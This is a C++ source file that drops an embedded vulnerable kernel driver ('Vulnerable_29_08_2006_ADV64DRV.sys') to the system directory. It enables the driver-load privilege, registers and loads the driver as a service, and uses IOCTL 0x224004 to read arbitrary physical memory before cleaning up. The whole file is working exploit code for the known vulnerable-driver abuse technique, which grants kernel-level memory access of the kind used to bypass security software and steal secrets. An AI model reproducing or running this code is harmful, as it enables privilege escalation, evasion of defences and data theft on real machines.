#include "DriverFile.h"
#include "Native.h"
#include "Driver.h"

#define DriverServiceName	L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services\\Vulnerable_29_08_2006_ADV64DRV"
#define DriverPath			L"\\SystemRoot\\Vulnerable_29_08_2006_ADV64DRV.sys"
#define DeviceName			L"\\Device\\ADV64DRV"

typedef struct _IOCTL_READPHYS {
	ULONGLONG PhysicalAddress;		//Input
	ULONGLONG NumberOfValues;		//Input
}IOCTL_READPHYS, * PIOCTL_READPHYS;

CDriver::CDriver() : DeviceHandle(NULL)
{

}
CDriver::~CDriver()
{
	Unload();
}

BOOLEAN CDriver::Load()
{
	if (MySetPrivilege(SE_LOAD_DRIVER_PRIVILEGE, SE_PRIVILEGE_ENABLED) != STATUS_SUCCESS)
		return FALSE;

	if (MyOpenFile(&DeviceHandle, DeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_ATTRIBUTE_DEVICE) == STATUS_SUCCESS)
		return TRUE;

	if (MySaveFileFromMemory(DriverPath, VulnerableDriver, sizeof(VulnerableDriver), NULL) != STATUS_SUCCESS)
		return FALSE;

	if (MyLoadUnloadDriver(DriverServiceName, DriverPath, 1) != STATUS_SUCCESS)
	{
		MyDeleteFile(DriverPath);
		return FALSE;
	}

	if (MyOpenFile(&DeviceHandle, DeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_ATTRIBUTE_DEVICE) != STATUS_SUCCESS)
	{
		MyLoadUnloadDriver(DriverServiceName, NULL);
		MyDeleteFile(DriverPath);
		return FALSE;
	}

	return TRUE;
}
VOID CDriver::Unload()
{
	if (DeviceHandle != NULL)
	{
		NtClose(DeviceHandle);
		MyLoadUnloadDriver(DriverServiceName, NULL);
		MyDeleteFile(DriverPath);
		DeviceHandle = NULL;
	}
}

BOOLEAN CDriver::ReadPhysical(ULONGLONG PhysicalAddress, PVOID Buffer, ULONG BufferSize)
{
	IOCTL_READPHYS buffer;
	buffer.PhysicalAddress = PhysicalAddress;
	buffer.NumberOfValues = BufferSize;
	return MyDeviceIoControl(DeviceHandle, 0x224004, &buffer, sizeof(buffer), Buffer, BufferSize, NULL) == STATUS_SUCCESS;
}